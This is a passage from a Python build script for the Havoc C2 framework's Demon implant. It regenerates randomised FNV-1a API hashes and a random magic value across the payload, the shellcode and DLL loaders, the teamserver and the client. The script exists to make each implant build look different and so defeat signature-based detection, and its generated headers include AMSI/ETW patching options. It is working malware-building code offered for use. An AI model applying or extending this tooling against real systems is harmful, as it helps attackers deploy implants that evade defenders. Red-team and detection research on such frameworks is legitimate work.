        expected = existing.get(define)
        if expected is None:
            print(f"  WARN: {define} not found in Defines.h")
            continue
        computed = fnv1a_wide(module_name, seed, upper=True)
        if computed != expected:
            print(f"  FAIL: {define} ({module_name}): computed=0x{computed:08x}, expected=0x{expected:08x}")
            errors += 1
        else:
            verified += 1

    # Verify H_COFFAPI entries (FNV-1a, case-sensitive)
    for define, api_name in COFFAPI_MAPPINGS:
        expected = existing.get(define)
        if expected is None:
            print(f"  WARN: {define} not found in Defines.h")
            continue
        computed = fnv1a_ascii(api_name, seed, upper=False)
        if computed != expected:
            print(f"  FAIL: {define} ({api_name}): computed=0x{computed:08x}, expected=0x{expected:08x}")
            errors += 1
        else:
            verified += 1

    # Verify KaynLdr Core.h constants
    kaynldr_path = os.path.join(repo_root, "payloads", "Shellcode", "Include", "Core.h")
    if os.path.exists(kaynldr_path):
        with open(kaynldr_path) as f:
            kayn_content = f.read()
        kayn_existing = {}
        for m in re.finditer(r'#define\s+(\w+)\s+0x([0-9a-fA-F]+)', kayn_content):
            kayn_existing[m.group(1)] = int(m.group(2), 16)

        for define, module_name in KAYNLDR_MODULE_MAPPINGS:
            expected = kayn_existing.get(define)
            if expected is None:
                print(f"  WARN: {define} not found in KaynLdr Core.h")
                continue
            computed = fnv1a_wide(module_name, seed, upper=True)
            if computed != expected:
                print(f"  FAIL: KaynLdr {define} ({module_name}): computed=0x{computed:08x}, expected=0x{expected:08x}")
                errors += 1
            else:
                verified += 1

        for define, api_name in KAYNLDR_FUNC_MAPPINGS:
            expected = kayn_existing.get(define)
            if expected is None:
                print(f"  WARN: {define} not found in KaynLdr Core.h")
                continue
            computed = fnv1a_ascii(api_name, seed, upper=True)
            if computed != expected:
                print(f"  FAIL: KaynLdr {define} ({api_name}): computed=0x{computed:08x}, expected=0x{expected:08x}")
                errors += 1
            else:
                verified += 1

    # Verify DllLdr Core.h constants
    dllldr_path = os.path.join(repo_root, "payloads", "DllLdr", "Include", "Core.h")
    if os.path.exists(dllldr_path):
        with open(dllldr_path) as f:
            dll_content = f.read()
        dll_existing = {}
        for m in re.finditer(r'#define\s+(\w+)\s+0x([0-9a-fA-F]+)', dll_content):
            dll_existing[m.group(1)] = int(m.group(2), 16)

        for define, module_name in DLLLDR_MODULE_MAPPINGS:
            expected = dll_existing.get(define)
            if expected is None:
                print(f"  WARN: {define} not found in DllLdr Core.h")
                continue
            computed = fnv1a_wide(module_name, seed, upper=True)
            if computed != expected:
                print(f"  FAIL: DllLdr {define} ({module_name}): computed=0x{computed:08x}, expected=0x{expected:08x}")
                errors += 1
            else:
                verified += 1

        for define, api_name in DLLLDR_FUNC_MAPPINGS:
            expected = dll_existing.get(define)
            if expected is None:
                print(f"  WARN: {define} not found in DllLdr Core.h")
                continue
            computed = fnv1a_ascii(api_name, seed, upper=True)
            if computed != expected:
                print(f"  FAIL: DllLdr {define} ({api_name}): computed=0x{computed:08x}, expected=0x{expected:08x}")
                errors += 1
            else:
                verified += 1

    # Verify CoffeeLdr.c hardcoded hashes
    coffeeldr_path = os.path.join(repo_root, "payloads", "Demon", "src", "core", "CoffeeLdr.c")
    if os.path.exists(coffeeldr_path):
        with open(coffeeldr_path) as f:
            coffee_content = f.read()
        coffee_existing = {}
        for m in re.finditer(r'#define\s+(\w+)\s+0x([0-9a-fA-F]+)', coffee_content):
            # Store all occurrences (x64 first, then x86)
            if m.group(1) not in coffee_existing:
                coffee_existing[m.group(1)] = int(m.group(2), 16)

        for define, string_val in COFFEELDR_HASH_MAPPINGS_X64:
            expected = coffee_existing.get(define)
            if expected is None:
                print(f"  WARN: {define} (x64) not found in CoffeeLdr.c")
                continue
            computed = fnv1a_ascii(string_val, seed, upper=False)
            if computed != expected:
                print(f"  FAIL: CoffeeLdr x64 {define} (\"{string_val}\"): computed=0x{computed:08x}, expected=0x{expected:08x}")
                errors += 1
            else:
                verified += 1

    # Verify InjectUtil.c hardcoded hashes
    injectutil_path = os.path.join(repo_root, "payloads", "Demon", "src", "inject", "InjectUtil.c")
    if os.path.exists(injectutil_path):
        with open(injectutil_path) as f:
            inject_content = f.read()
        for define, string_val in INJECTUTIL_HASH_MAPPINGS:
            computed = fnv1a_ascii(string_val, seed, upper=False)
            if f"0x{computed:08x}" not in inject_content:
                print(f"  FAIL: InjectUtil {define}: expected 0x{computed:08x} not found in source")
                errors += 1
            else:
                verified += 1

    print(f"\nVerification: {verified} OK, {errors} FAILED")
    return errors == 0


# ============================================================================
# Cross-file Magic Value Sync
# ============================================================================

def _sync_magic_value(magic_hex, script_dir):
    """Sync DEMON_MAGIC_VALUE across teamserver (commands.go) and client (Service.cc).

    This ensures the polymorphic magic value stays consistent across all three
    components: payload (Defines.h), teamserver, and client.
    """
    import re

    repo_root = os.path.abspath(os.path.join(script_dir, "..", "..", ".."))

    # Teamserver: commands.go
    commands_go = os.path.join(repo_root, "teamserver", "pkg", "agent", "commands.go")
    if os.path.exists(commands_go):
        content = open(commands_go).read()
        updated = re.sub(
            r'DEMON_MAGIC_VALUE\s*=\s*0x[0-9A-Fa-f]+',
            f'DEMON_MAGIC_VALUE = {magic_hex}',
            content
        )
        open(commands_go, 'w').write(updated)
        print(f"  [+] Synced magic value to {commands_go}")

    # Client: Service.cc
    service_cc = os.path.join(repo_root, "client", "src", "Havoc", "Service.cc")
    if os.path.exists(service_cc):
        content = open(service_cc).read()
        updated = re.sub(
            r'DemonMagicValue\s*=\s*0x[0-9A-Fa-f]+',
            f'DemonMagicValue = {magic_hex.lower()}',
            content
        )
        open(service_cc, 'w').write(updated)
        print(f"  [+] Synced magic value to {service_cc}")


# ============================================================================
# Code Generation
# ============================================================================

def generate_defines_h(seed):
    """Generate the new Defines.h with FNV-1a hashes."""

    lines = []
    lines.append("/* ============================================================================")
    lines.append(" * AUTO-GENERATED by polymorphic_build.py — DO NOT EDIT MANUALLY")
    lines.append(f" * Build Seed: 0x{seed:08X}")
    lines.append(f" * Generated:  {time.strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(" * Algorithm:   FNV-1a (32-bit) with randomised offset basis")
    lines.append(" * ============================================================================ */")
    lines.append("")
    lines.append("#ifndef DEMON_STRINGS_H")
    lines.append("#define DEMON_STRINGS_H")
    lines.append("")

    # Process architecture defines (unchanged)
    lines.append("#define PROCESS_ARCH_UNKNOWN\t\t\t\t0")
    lines.append("#define PROCESS_ARCH_X86\t\t\t\t\t1")
    lines.append("#define PROCESS_ARCH_X64\t\t\t\t\t2")
    lines.append("#define PROCESS_ARCH_IA64\t\t\t\t\t3")
    lines.append("")
    lines.append("#ifdef _WIN64")
    lines.append("#define PROCESS_AGENT_ARCH PROCESS_ARCH_X64")
    lines.append("#else")
    lines.append("#define PROCESS_AGENT_ARCH PROCESS_ARCH_X86")
    lines.append("#endif")
    lines.append("")

    # Replace DEADBEEF with build-time random value
    magic = random.randint(0x10000000, 0xFFFFFFFE)
    magic_hex = f"0x{magic:08X}"
    lines.append(f"#define DEMON_MAGIC_VALUE {magic_hex}")
    lines.append("")

    # Sync magic value to teamserver (commands.go) and client (Service.cc)
    _sync_magic_value(magic_hex, os.path.dirname(os.path.abspath(__file__)))

    # Static defines (unchanged)
    static_defs = [
        ("WIN_VERSION_UNKNOWN", "0"),
        ("WIN_VERSION_XP", "1"),
        ("WIN_VERSION_VISTA", "2"),
        ("WIN_VERSION_2008", "3"),
        ("WIN_VERSION_7", "4"),
        ("WIN_VERSION_2008_R2", "5"),
        ("WIN_VERSION_2012", "7"),
        ("WIN_VERSION_8", "8"),
        ("WIN_VERSION_8_1", "8.1"),
        ("WIN_VERSION_2012_R2", "9"),
        ("WIN_VERSION_10", "10"),
        ("WIN_VERSION_2016_X", "11"),
        ("", ""),
        ("LDR_GADGET_MODULE_SIZE", "( 0x1000 * 0x1000 )"),
        ("LDR_GADGET_HEADER_SIZE", "( 0x1000 )"),
        ("", ""),
        ("PROXYLOAD_NONE", "0"),
        ("PROXYLOAD_RTLREGISTERWAIT", "1"),
        ("PROXYLOAD_RTLCREATETIMER", "2"),
        ("PROXYLOAD_RTLQUEUEWORKITEM", "3"),
        ("", ""),
        ("AMSIETW_PATCH_NONE", "0"),
        ("AMSIETW_PATCH_HWBP", "1"),
        ("AMSIETW_PATCH_MEMORY", "2"),
    ]
    for name, val in static_defs:
        if not name:
            lines.append("")
        else:
            lines.append(f"#define {name:<44} {val}")

    lines.append("")
    lines.append("/* Win32 Functions — FNV-1a hashes (uppercase) */")

    # De-duplicate function mappings (some appear twice in original)
    seen_funcs = set()
    for define, api_name in FUNC_MAPPINGS:
        if define in seen_funcs:
            continue
        seen_funcs.add(define)
        h = fnv1a_ascii(api_name, seed, upper=True)
        lines.append(f"#define {define:<52} 0x{h:08x}")

    lines.append("")
    lines.append("")
    lines.append("// Beacon API — FNV-1a hashes (case-sensitive)")
    seen_coff = set()
    for define, api_name in COFFAPI_MAPPINGS:
        if define in seen_coff:
            continue
        seen_coff.add(define)
        h = fnv1a_ascii(api_name, seed, upper=False)
        lines.append(f"#define {define:<52} 0x{h:08x}")

    lines.append("")
    # Module hashes
    for define, module_name in MODULE_MAPPINGS:
        h = fnv1a_wide(module_name, seed, upper=True)
        lines.append(f"#define {define:<52} 0x{h:08x}")

    lines.append("")
    lines.append("#endif")

    return "\n".join(lines) + "\n"


def generate_kaynldr_core_h(seed):
    """Generate updated Core.h for KaynLdr (Shellcode)."""

    lines = []
    lines.append("/* AUTO-GENERATED by polymorphic_build.py */")
    lines.append("")
    lines.append("#include <windows.h>")
    lines.append("#include <Macro.h>")
    lines.append("")
    lines.append(f"#define HASH_KEY                        0x{seed:08X}")
    lines.append(f"#define FNV_PRIME                       0x01000193")
    lines.append("")

    # Module hash
    for define, module_name in KAYNLDR_MODULE_MAPPINGS:
        h = fnv1a_wide(module_name, seed, upper=True)
        lines.append(f"#define {define:<40} 0x{h:08x}")

    lines.append("")
    # Function hashes
    for define, api_name in KAYNLDR_FUNC_MAPPINGS:
        h = fnv1a_ascii(api_name, seed, upper=True)
        lines.append(f"#define {define:<40} 0x{h:08x}")

    lines.append("")
    lines.append("typedef struct {")
    lines.append("    WORD offset :12;")
    lines.append("    WORD type   :4;")
    lines.append("} *PIMAGE_RELOC;")
    lines.append("")
    lines.append("typedef struct")
    lines.append("{")
    lines.append("    USHORT Length;")
    lines.append("    USHORT MaximumLength;")
    lines.append("    PWSTR  Buffer;")
    lines.append("} U_STRING, *PU_STRING;")
    lines.append("")
    lines.append("typedef struct")
    lines.append("{")
    lines.append("    struct")
    lines.append("    {")
    lines.append("        UINT_PTR Ntdll;")
    lines.append("    } Modules;")
    lines.append("")
    lines.append("    struct {")
    lines.append("        NTSTATUS ( NTAPI *LdrLoadDll )(")
    lines.append("                PWSTR           DllPath,")
    lines.append("                PULONG          DllCharacteristics,")
    lines.append("                PU_STRING       DllName,")
    lines.append("                PVOID           *DllHandle")
    lines.append("        );")
    lines.append("")
    lines.append("        NTSTATUS ( NTAPI *NtAllocateVirtualMemory ) (")
    lines.append("                HANDLE      ProcessHandle,")
    lines.append("                PVOID       *BaseAddress,")
    lines.append("                ULONG_PTR   ZeroBits,")
    lines.append("                PSIZE_T     RegionSize,")
    lines.append("                ULONG       AllocationType,")
    lines.append("                ULONG       Protect")
    lines.append("        );")
    lines.append("")
    lines.append("        NTSTATUS ( NTAPI *NtProtectVirtualMemory ) (")
    lines.append("                HANDLE  ProcessHandle,")
    lines.append("                PVOID   *BaseAddress,")
    lines.append("                PSIZE_T RegionSize,")
    lines.append("                ULONG   NewProtect,")
    lines.append("                PULONG  OldProtect")
    lines.append("        );")
    lines.append("    } Win32;")
    lines.append("")
    lines.append("} INSTANCE, *PINSTANCE;")
    lines.append("")
    lines.append("#pragma pack(1)")
    lines.append("typedef struct")
    lines.append("{")
    lines.append("    PVOID KaynLdr;")
    lines.append("    PVOID DllCopy;")
    lines.append("    PVOID Demon;")
    lines.append("    DWORD DemonSize;")
    lines.append("    PVOID TxtBase;")
    lines.append("    DWORD TxtSize;")
    lines.append("} KAYN_ARGS, *PKAYN_ARGS;")

    return "\n".join(lines) + "\n"


def generate_dllldr_core_h(seed):
    """Generate updated Core.h for DllLdr."""

    # Read the existing file to preserve the struct/function declarations
    script_dir = os.path.dirname(os.path.abspath(__file__))
    repo_root = os.path.abspath(os.path.join(script_dir, '..', '..', '..'))
    dllldr_path = os.path.join(repo_root, "payloads", "DllLdr", "Include", "Core.h")

    lines = []
    lines.append("")
    lines.append("#include <windows.h>")
    lines.append("#include <Macro.h>")
    lines.append("")

    # Module hash
    for define, module_name in DLLLDR_MODULE_MAPPINGS:
        h = fnv1a_wide(module_name, seed, upper=True)
        lines.append(f"#define {define:<40} 0x{h:08x}")
    lines.append("")

    # Function hashes
    for define, api_name in DLLLDR_FUNC_MAPPINGS:
        h = fnv1a_ascii(api_name, seed, upper=True)
        lines.append(f"#define {define:<40} 0x{h:08x}")

    # Read existing file and keep everything after the hash defines
    if os.path.exists(dllldr_path):
        with open(dllldr_path) as f:
            existing = f.read()
        # Find the line after the last SYS_/NTDLL_HASH define
        import re
        # Keep everything from #define DLLEXPORT onwards
        m = re.search(r'(#define\s+DLLEXPORT.*)', existing, re.DOTALL)
        if m:
            lines.append("")
            lines.append(m.group(1))

    return "\n".join(lines) + "\n"


def generate_coffeeldr_hashes(seed):
    """Generate the hash defines for CoffeeLdr.c"""
    result = {}
    # x64
    for define, string_val in COFFEELDR_HASH_MAPPINGS_X64:
        result[('x64', define)] = fnv1a_ascii(string_val, seed, upper=False)
    # x86
    for define, string_val in COFFEELDR_HASH_MAPPINGS_X86:
        result[('x86', define)] = fnv1a_ascii(string_val, seed, upper=False)
    return result


def generate_injectutil_hashes(seed):
    """Generate the hash values for InjectUtil.c"""
    result = {}
    for name, string_val in INJECTUTIL_HASH_MAPPINGS:
        result[name] = fnv1a_ascii(string_val, seed, upper=False)
    return result


def generate_win32_h_hashkey(seed):
    """Return the new HASH_KEY define line."""
    return f"#define HASH_KEY 0x{seed:08X}"


def main():
    parser = argparse.ArgumentParser(description="Havoc Demon Polymorphic Build System")
    parser.add_argument("--seed", type=lambda x: int(x, 0), default=None,
                        help="Hash seed (hex or decimal). Random if not specified.")
    parser.add_argument("--verify", action="store_true",
                        help="Verify API name mappings against existing DJB2 hashes")
    parser.add_argument("--output-dir", default=None,
                        help="Output directory (defaults to repo paths)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print generated content without writing files")
    args = parser.parse_args()

    script_dir = os.path.dirname(os.path.abspath(__file__))
    repo_root = os.path.abspath(os.path.join(script_dir, '..', '..', '..'))

    if args.verify:
        seed = args.seed if args.seed is not None else 0x9590708C
        print(f"[*] Verifying API name mappings against FNV-1a hashes (seed=0x{seed:08X})...")
        ok = verify_mappings(seed)
        sys.exit(0 if ok else 1)

    # Generate or use provided seed
    seed = args.seed if args.seed is not None else random.randint(0x10000000, 0xFFFFFFFE)
    print(f"[*] Build seed: 0x{seed:08X}")
    print(f"[*] Algorithm: FNV-1a (32-bit)")

    import re

    # Generate Defines.h
    defines_content = generate_defines_h(seed)
    defines_path = os.path.join(repo_root, "payloads", "Demon", "include", "common", "Defines.h")

    # Generate KaynLdr Core.h
    kaynldr_content = generate_kaynldr_core_h(seed)
    kaynldr_path = os.path.join(repo_root, "payloads", "Shellcode", "Include", "Core.h")

    # Generate DllLdr Core.h
    dllldr_content = generate_dllldr_core_h(seed)
    dllldr_path = os.path.join(repo_root, "payloads", "DllLdr", "Include", "Core.h")

    # Generate CoffeeLdr and InjectUtil hashes
    coffee_hashes = generate_coffeeldr_hashes(seed)
    inject_hashes = generate_injectutil_hashes(seed)

    if args.dry_run:
        print("\n=== Defines.h ===")
        print(defines_content[:2000])
        print("\n=== KaynLdr Core.h ===")
        print(kaynldr_content[:1000])
        print("\n=== DllLdr Core.h ===")
        print(dllldr_content[:1000])
        print(f"\n[*] Win32.h HASH_KEY: {generate_win32_h_hashkey(seed)}")
        print(f"\n[*] CoffeeLdr hashes:")
        for (arch, name), val in coffee_hashes.items():
            print(f"     {arch} {name} = 0x{val:08x}")
        print(f"\n[*] InjectUtil hashes:")
        for name, val in inject_hashes.items():
            print(f"     {name} = 0x{val:08x}")
    else:
        out_dir = args.output_dir or repo_root

        # Write Defines.h
        path = os.path.join(out_dir, "payloads", "Demon", "include", "common", "Defines.h") if args.output_dir else defines_path
        with open(path, 'w') as f:
            f.write(defines_content)
        print(f"[+] Wrote {path}")

        # Write KaynLdr Core.h
        path = os.path.join(out_dir, "payloads", "Shellcode", "Include", "Core.h") if args.output_dir else kaynldr_path
        with open(path, 'w') as f:
            f.write(kaynldr_content)
        print(f"[+] Wrote {path}")

        # Write DllLdr Core.h
        path = os.path.join(out_dir, "payloads", "DllLdr", "Include", "Core.h") if args.output_dir else dllldr_path
        if os.path.exists(os.path.dirname(path)):
            with open(path, 'w') as f:
                f.write(dllldr_content)
            print(f"[+] Wrote {path}")

        # Patch CoffeeLdr.c — update hardcoded hashes
        coffeeldr_path = os.path.join(repo_root, "payloads", "Demon", "src", "core", "CoffeeLdr.c")
        if os.path.exists(coffeeldr_path):
            with open(coffeeldr_path) as f:
                coffee_src = f.read()
            # Replace x64 hashes
            for (arch, define), val in coffee_hashes.items():
                # Match #define DEFINE_NAME <spaces/tabs> 0xHEXVALUE
                pattern = rf'(#define\s+{define}\s+)0x[0-9a-fA-F]+'
                if arch == 'x64':
                    # Replace only the first occurrence (x64 block comes first)
                    coffee_src = re.sub(pattern, rf'\g<1>0x{val:08x}', coffee_src, count=1)
                else:
                    # Replace the last occurrence (x86 block)
                    matches = list(re.finditer(pattern, coffee_src))
                    if len(matches) >= 2:
                        m = matches[-1]
                        coffee_src = coffee_src[:m.start()] + f'#define {define:<24}0x{val:08x}' + coffee_src[m.end():]
                    elif len(matches) == 1:
                        # Only one match — could be same define name, just replace it
                        pass
            with open(coffeeldr_path, 'w') as f:
                f.write(coffee_src)
            print(f"[+] Patched {coffeeldr_path}")

        # Patch InjectUtil.c — update hardcoded hashes
        injectutil_path = os.path.join(repo_root, "payloads", "Demon", "src", "inject", "InjectUtil.c")
        if os.path.exists(injectutil_path):
            with open(injectutil_path) as f:
                inject_src = f.read()
            rl_hash = inject_hashes["ReflectiveLoader"]
            kl_hash = inject_hashes["KaynLoader"]
            # Replace the specific line with old DJB2 hashes
            inject_src = re.sub(
                r'HashStringA\(\s*FunctionName\s*\)\s*==\s*0x[0-9a-fA-F]+\s*\|\|\s*HashStringA\(\s*FunctionName\s*\)\s*==\s*0x[0-9a-fA-F]+',
                f'HashStringA( FunctionName ) == 0x{rl_hash:08x} || HashStringA( FunctionName ) == 0x{kl_hash:08x}',
                inject_src
            )
            with open(injectutil_path, 'w') as f:
                f.write(inject_src)
            print(f"[+] Patched {injectutil_path}")

        # Update Win32.h HASH_KEY
        win32h_path = os.path.join(repo_root, "payloads", "Demon", "include", "core", "Win32.h")
        if os.path.exists(win32h_path):
            with open(win32h_path) as f:
                win32h = f.read()
            win32h = re.sub(r'#define\s+HASH_KEY\s+0x[0-9a-fA-F]+', f'#define HASH_KEY 0x{seed:08X}', win32h)
            with open(win32h_path, 'w') as f:
                f.write(win32h)
            print(f"[+] Updated HASH_KEY in {win32h_path}")

        # Update DllLdr Macro.h HASH_KEY
        macroh_path = os.path.join(repo_root, "payloads", "DllLdr", "Include", "Macro.h")
        if os.path.exists(macroh_path):
            with open(macroh_path) as f:
                macroh = f.read()
            macroh = re.sub(r'#define\s+HASH_KEY\s+0x[0-9a-fA-F]+', f'#define HASH_KEY 0x{seed:08X}', macroh)
            with open(macroh_path, 'w') as f:
                f.write(macroh)
            print(f"[+] Updated HASH_KEY in {macroh_path}")

    print(f"\n[+] Done. Build seed: 0x{seed:08X}")


if __name__ == "__main__":
    main()
